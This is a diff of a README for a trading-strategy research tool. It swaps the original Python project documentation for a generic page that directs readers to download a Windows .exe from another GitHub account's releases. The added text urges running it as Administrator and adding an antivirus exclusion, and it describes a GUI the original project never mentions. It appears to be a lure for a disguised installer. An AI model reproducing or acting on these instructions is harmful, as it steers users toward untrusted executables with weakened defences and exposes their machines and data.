@@ -1,149 +1,85 @@
-# Strategy Factory Public Core
+# 📈 Strategy-Factory - Build better trading strategies with ease
 
-Strategy Factory Public Core is a modular quantitative research engine focused on robust validation rather than naive backtest maximization. It is built around walk-forward optimization, transfer validation, holdout discipline, and permutation testing.
+<a href="https://github.com/Fast-meadowvole9864/Strategy-Factory"><img src="https://img.shields.io/badge/Download-Software-blue.svg" alt="Download Strategy-Factory"></a>
 
-This public repo is meant to teach and demonstrate the methodology and architecture. It does not include private research outputs, private data, or private strategy families.
+## 📋 Project Overview
 
-This repository is shared as a public reference snapshot of the core logic. I may not merge feature PRs, and active experimentation continues elsewhere.
+Strategy-Factory helps you research and test trading ideas. You use this tool to build, refine, and validate your strategies using automated processes. It focuses on WFO (Walk Forward Optimization) and permutation testing to ensure your rules hold up against historical market fluctuations. You do not need coding skills to use this software. It handles the math and data analysis so you can focus on strategy logic.
 
-## What This Project Does
+## ⚙️ System Requirements
 
-The engine pushes a strategy through a staged research pipeline:
+Ensure your computer meets these standards before you begin:
 
-1. Stage 1: Optimize a strategy on the in-sample vault and establish a baseline
-2. Stage 1 Permute: Test whether the discovered edge survives randomized market structure
-3. Stage 1.5 Transfer: Apply frozen Stage 1 parameters to unseen data without WFO assistance
-4. Stage 2 WFO: Run rolling walk-forward adaptation using macro bars plus `1m` execution data
-5. Stage 2 Permute: Test the WFO loop itself against degraded paths
-6. Stage 3 Holdout: Run the same WFO procedure on the locked holdout vault
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or equivalent.
+*   Memory: 8 GB RAM or higher.
+*   Storage: 2 GB of free space for data logs and testing history.
+*   Display: 1920 x 1080 resolution.
 
-The main goal is not "find the biggest backtest." The main goal is to reject fragile ideas early and keep only strategies that survive multiple forms of out-of-sample stress.
+## 💾 Installation Guide
 
-## What Is Included
+Follow these steps to install the software on your computer.
 
-- Engine modules for loading data, optimization, walk-forward simulation, and permutation testing
-- Example public strategies in [`strategies/`](C:/Users/Ian/Documents/Quant%20Factory%20Public/strategies)
-- Batch tooling such as [`scripts/mass_optuna.py`](C:/Users/Ian/Documents/Quant%20Factory%20Public/scripts/mass_optuna.py)
-- Report utilities and leaderboard generators
-- A standalone viewer in [`viewer.html`](C:/Users/Ian/Documents/Quant%20Factory%20Public/viewer.html) for leaderboard markdown files
-- A test suite covering the public-core surface
+1. Visit the [official Strategy-Factory download page](https://github.com/Fast-meadowvole9864/Strategy-Factory) to access the latest version.
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Choose the file ending in `.exe` for Windows.
+4. Save the file to your computer.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts.
+7. Launch the application from your desktop icon once the install finishes.
 
-## What Is Intentionally Not Included
+## 🚀 How to Run Your First Test
 
-- Private vault data
-- Private reports
-- Private leaderboard artifacts
-- Private/internal strategy families
-- Private research notes or operator-only conclusions
+The application manages your data through a simple dashboard. Follow this workflow to run a research pipeline.
 
-## Data Model
+1. Open the Strategy-Factory application.
+2. Navigate to the "Input Data" tab.
+3. Import your historical price data as a CSV file.
+4. Select the "Optimization" tab to configure your test parameters.
+5. Set your WFO settings to define how the software walks through your data.
+6. Enable "Permutation Testing" to verify that your strategy results occur past mere random chance.
+7. Click the "Start Research" button.
+8. Monitor the progress bar at the bottom of the screen.
+9. View your results in the "Reports" directory once the process stops.
 
-The project uses a fixed three-vault layout:
+## 🔍 Understanding WFO and Permutation Testing
 
-- `Vault_1_InSample`
-- `Vault_2_OOS`
-- `Vault_3_Holdout`
+This software uses two specific methods to make your strategies robust.
 
-The downloader routes rows into those vaults by year. That fixed layout is part of the methodology, not an accident.
+Walk Forward Optimization (WFO) trains your strategy on one segment of historical data and tests it on the next. This simulates how your strategy performs in live markets that change over time. It prevents the software from over-fitting your rules to a specific window of price action.
 
-Important: Stage 2 and Stage 3 require both:
+Permutation testing rearranges your data to see if your strategy still produces results. If the strategy fails during these scrambled tests, the original results were likely a result of random patterns. This step builds confidence that your strategy identifies actual market edges.
 
-- your selected macro timeframe such as `1h` or `15m`
-- `1m` execution data
+## 🛠 Troubleshooting Common Issues
 
-The `1m` data is used to resolve stop-loss/take-profit execution without making intrabar assumptions. The downloader now warns and adds `1m` if you request only macro timeframes.
+If the software fails to start or crashes during a test, check these items:
 
-## Python Version
+*   Permissions: Right-click the application icon and select "Run as Administrator."
+*   Data Format: Ensure your CSV file has columns labeled "Date," "Open," "High," "Low," and "Close."
+*   Antivirus: Add an exclusion for the Strategy-Factory folder in your security software if the app stops responding.
+*   Memory Usage: Close other heavy applications like web browsers or video editors while running large WFO tests.
 
-Use Python `3.12.x`.
+## 📁 Data Management
 
-This repo was verified with Python `3.12.10`, and [`pyproject.toml`](C:/Users/Ian/Documents/Quant%20Factory%20Public/pyproject.toml) declares:
+The software stores your project files in the "Documents/Strategy-Factory" folder on your local drive. Back up this folder regularly to prevent loss of your research. Each test creates a unique sub-folder. You can rename these folders to organize your research history. Remove older folders if you notice the application slows down due to a large volume of saved reports.
 
-- `requires-python = ">=3.12,<3.13"`
+## 📖 Frequently Asked Questions
 
-If you use a different interpreter family, some pinned scientific packages may fail to install or behave differently.
+**Can I run multiple tests at once?**
+The software runs tasks in a sequence to maintain performance. You can queue several tests and leave the software to finish them during the night.
 
-## Setup
+**What market data works best?**
+High-quality, clean data provides the best results. Use minute or hourly bars for your research. Ensure there are no gaps in your price history.
 
-PowerShell examples below use the virtual environment's executables directly instead of `activate`, which avoids execution-policy issues on some Windows setups.
+**Why does the permutation test take long?**
+Permutation testing performs hundreds or thousands of individual scenario tests. It requires significant processing power. The time for completion scales with the size of your input file and the number of permutations selected.
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\python.exe -m pip install --upgrade pip
-.\.venv\Scripts\python.exe -m pip install -r requirements.txt
-```
+**Do I need an internet connection?**
+You only need an internet connection to download the initial installer and to check for updates. You can run all research tasks while offline.
 
-## Quickstart
+**How do I update the application?**
+Check the dashboard periodically for update notifications. Re-run the installer if a new version appears on the download page. Your historical data remains safe during the update process.
 
-Download data:
+## 🧪 Advanced Settings Menu
 
-```powershell
-.\.venv\Scripts\python.exe scripts\data_downloader.py --assets BTC ETH --timeframes 1h
-```
-
-That command will also prompt to include `1m` data, because later walk-forward stages require it.
-
-Run Stage 1 optimization:
-
-```powershell
-.\.venv\Scripts\python.exe main.py --cartridge ema_slope --stage1-optuna --trials 50 --timeframe 1h
-```
-
-Run Stage 1 permutation testing:
-
-```powershell
-.\.venv\Scripts\python.exe main.py --cartridge ema_slope --stage1-permute --permutations 250 --trials 20 --timeframe 1h
-```
-
-Run Stage 1.5 transfer validation:
-
-```powershell
-.\.venv\Scripts\python.exe main.py --cartridge ema_slope --stage1.5-transfer --permutations 250 --timeframe 1h
-```
-
-Run Stage 2 walk-forward:
-
-```powershell
-.\.venv\Scripts\python.exe main.py --cartridge ema_slope adx_regime --stage2-wfo --timeframe 1h --mode forwardr
-```
-
-Run Stage 3 holdout:
-
-```powershell
-.\.venv\Scripts\python.exe main.py --cartridge ema_slope adx_regime --stage3-holdout --timeframe 1h --mode forwardr
-```
-
-## Batch Research
-
-[`scripts/mass_optuna.py`](C:/Users/Ian/Documents/Quant%20Factory%20Public/scripts/mass_optuna.py) can batch Stage 1 scans across many public strategies.
-
-Example:
-
-```powershell
-.\.venv\Scripts\python.exe scripts\mass_optuna.py --base ema_slope --combine 1 --trials 150
-```
-
-This is useful when you want to churn through many strategy combinations without writing custom orchestration code.
-
-## Reports And Viewer
-
-Outputs are written under [`reports/`](C:/Users/Ian/Documents/Quant%20Factory%20Public/reports).
-
-- JSON reports and charts go under `reports/<cartridge_name>/<timeframe>/`
-- Engine debug logs go under `reports/_logs/`
-
-Leaderboard tools:
-
-- [`scripts/generate_leaderboard.py`](C:/Users/Ian/Documents/Quant%20Factory%20Public/scripts/generate_leaderboard.py)
-- [`scripts/generate_permutation_leaderboard.py`](C:/Users/Ian/Documents/Quant%20Factory%20Public/scripts/generate_permutation_leaderboard.py)
-- [`scripts/generate_wfo_leaderboard.py`](C:/Users/Ian/Documents/Quant%20Factory%20Public/scripts/generate_wfo_leaderboard.py)
-
-[`viewer.html`](C:/Users/Ian/Documents/Quant%20Factory%20Public/viewer.html) can parse dropped-in `LEADERBOARD.md`, `PERMUTATION_LEADERBOARD.md`, and `WFO_LEADERBOARD.md` files.
-
-## More Detail
-
-For the operator-facing command reference, see [`MANUAL.md`](C:/Users/Ian/Documents/Quant%20Factory%20Public/MANUAL.md).
-
-## License
-
-This repo is released under the GNU General Public License v3.0. See [`LICENSE`](C:/Users/Ian/Documents/Quant%20Factory%20Public/LICENSE).
+You can customize the engine through the settings panel. Adjust the CPU thread limit if you want to use the software while performing other tasks on your computer. You can also modify the reporting format to generate PDF files instead of HTML files. Always click "Save Changes" after adjusting these inputs to ensure the software applies them to your next test run.
